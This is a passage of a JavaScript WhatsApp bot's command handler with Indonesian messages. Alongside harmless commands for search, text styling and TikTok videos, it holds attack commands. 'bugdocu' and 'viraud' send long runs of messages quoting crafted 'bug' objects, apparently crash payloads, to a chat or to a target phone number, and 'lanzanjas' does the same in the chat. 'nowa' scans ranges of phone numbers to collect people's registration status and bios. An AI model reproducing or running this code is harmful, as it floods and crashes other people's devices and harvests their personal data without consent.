mediaUrl:anup3k.url,
}

},
},{quoted:m})
await fs.unlinkSync(pl.path)
}
break

case 'yts': case 'ytsearch': {
if (!q) return replyy(`Example : ${prefix + command} story wa anime`)
yts = require("yt-search")
search = await yts(q)
nyaabanaayts = 'YouTube Search\n\n Result From '+q+'\n\n'
no = 1
for (let i of search.all) {
hasilpencarian = `${nyaabanaayts}\nNo : ${no++}\n Type : ${i.type}\n Video ID : ${i.videoId}\n Title : ${i.title}\n Views : ${i.views}\n Duration : ${i.timestamp}\n Uploaded : ${i.ago}\n Url : ${i.url}\n\n─────────────────\n\n`
}
qio.sendMessage(from, { image: { url: search.all[0].thumbnail },  caption: hasilpencarian }, { quoted: m })
}
break

case 'style': case 'styletext': {
let { styletext } = require('./lib/scraper')
if (!q) return replyy('Enter Query text!')
let anu = await styletext(q)
let teks = `Style Text From ${q}\n\n`
for (let i of anu) {
teks += `*${i.name}* : ${i.result}\n\n`
}
replyy(teks)
}
break

case 'fliptext': {
if (args.length < 1) return replyy(`Example:\n${prefix}fliptext qio`)
quere = args.join(" ")
flipe = quere.split('').reverse().join('')
replyy(`\`\`\`「 FLIP TEXT 」\`\`\`\n*•> Normal :*\n${quere}\n*•> Flip :*\n${flipe}`)
}
break

case 'setppbot': case 'setbotpp': {
if (!isCreator) return m.reply(global.nocreator)
if (!quoted) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (!/image/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
if (/webp/.test(mime)) return replyy(`Send/Reply Image With Caption ${prefix + command}`)
var medis = await qio.downloadAndSaveMediaMessage(quoted)
if (args[0] == `/full`) {
var { img } = await generateProfilePicture(medis)
await qio.query({
tag: 'iq',
attrs: {
to: botNumber,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(medis)
replyy(`Success`)
} else {
var memeg = await qio.updateProfilePicture(botNumber, { url: medis })
fs.unlinkSync(medis)
replyy(`Success`)
}
}
break

case 'tiktokgirl':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/tiktokgirl.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokghea':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/gheayubi.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknukhty':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/ukhty.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoksantuy':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/santuy.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokkayes':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/kayes.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktokpanrika':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/panrika.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'tiktoknotnot':
replyy('Tunggu')
asupan = JSON.parse(fs.readFileSync('./lib/tiktok/notnot.json'))
hasil = pickRandom(asupan)
qio.sendMessage(from, { caption: 'Sukses', video: { url: hasil.url }}, { quoted: m })
break

case 'nowa': {
if (!isCreator) return m.reply(global.nocreator)
if (!q) return m.reply(`Masukkan nomor, contoh ${prefix+command} 62853388888xxx`)
var noteks = args[0]
if (!noteks.includes('x')) return m.reply('Masukkan akhiran x untuk mencari nomor?')
function countInstances(string, word) {
return string.split(word).length - 1;
}
var nomer0 = noteks.split('x')[0]
var nomer1 = noteks.split('x')[countInstances(noteks, 'x')] ? noteks.split('x')[countInstances(noteks, 'x')]: ''
var random_length = countInstances(noteks, 'x')
if (random_length > 4) {
  return m.reply('Maaf, hanya bisa mencari nomor dengan maksimal 4 x')
}
var random;
m.reply('Loading')
if (random_length == 1) {
  random = 10
} else if (random_length == 2) {
  random = 100
} else if (random_length == 3) {
  random = 1000
} else if (random_length == 4) {
  random = 10000
}
var nomerny = `Have a bio\n`
var no_bio = `\nWithout Bio / Default bio.\n`
var no_watsap = `\nNot registered on whatsapp\n`
var data = {}
for (let i = 0; i < random; i++) {
  var nu = ['1','2','3','4','5','6','7','8','9']
  var t1 = nu[Math.floor(Math.random() * nu.length)]
  var t2 = nu[Math.floor(Math.random() * nu.length)]
  var t3 = nu[Math.floor(Math.random() * nu.length)]
  var t4 = nu[Math.floor(Math.random() * nu.length)]
  var rndm;
  if (random_length == 1) {
    rndm = `${t1}`
  } else if (random_length == 2) {
    rndm = `${t1}${t2}`
  } else if (random_length == 3) {
    rndm = `${t1}${t2}${t3}`
  } else if (random_length == 4) {
    rndm = `${t1}${t2}${t3}${t4}`
  }
  var anu = await qio.onWhatsApp(`${nomer0}${i}${nomer1}@s.whatsapp.net`);
  var anuu = anu.length !== 0 ? anu: false
  try {
    try {
      var anu1 = await qio.fetchStatus(anu[0].jid)
    } catch {
      var anu1 = '401'
    }
    if (anu1 == '401' || anu1.status.length == 0) {
      no_bio += `wa.me/${anu[0].jid.split("@")[0]}\n`
    } else {
      const year = moment(anu1.setAt).tz('Asia/Jakarta').format('YYYY');
      if (!(year in data)) {
        data[year] = [];
      }
      data[year].push(`wa.me/${anu[0].jid.split("@")[0]}\nBio : ${anu1.status}\nDate : ${moment(anu1.setAt).tz('Asia/Jakarta').format('HH:mm:ss DD/MM/YYYY')}\n\n`);
    }
  } catch {
    no_watsap += `${nomer0}${i}${nomer1}\n`
  }
}
const bio = Object.keys(data)
.map((key) => {
  return `*[ ${key} ]*\n${data[key].join('')}`
})
.join('\n')
const hasil = `Results of\n${noteks}:\n\n${nomerny}${bio}${no_bio}${no_watsap}\n\n.`
m.reply(hasil)
}
break

case 'lanzanjas':
if (!isCreator) return m.reply(global.nocreator)
bug = { 
key: {
fromMe: ['Lanzz'], 
participant: '', ...('' ? { remoteJid: "" } : {}) 
},
'message': {
"documentMessage": {
"fileName": global.doku2,
"remoteJid": "",
}}}
qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
await qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
await qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
await qio.sendMessage(from, {text: 'Lanz Top'},{quoted: bug})
break

case 'bugdocu': 
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzelitcees })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(from, { document : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
break

case 'viraud': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
 Pe = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : qtext.replace(/[^0-9]/g,'')+"@s.whatsapp.net"
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
qio.sendMessage(Pe, { audio : qioimage }, { quoted:lanzbatosai })
await sleep(2000)
m.reply(`*UDAH DI SEND YA BROK*`)
break

case 'senddocu': 
  if (!isCreator) return m.reply(`KHUSUS OWNER`)
 if (!args[0]) return m.reply(`Use ${prefix+command} number\nExample ${prefix+command} 62xxxxxxxxxx`)
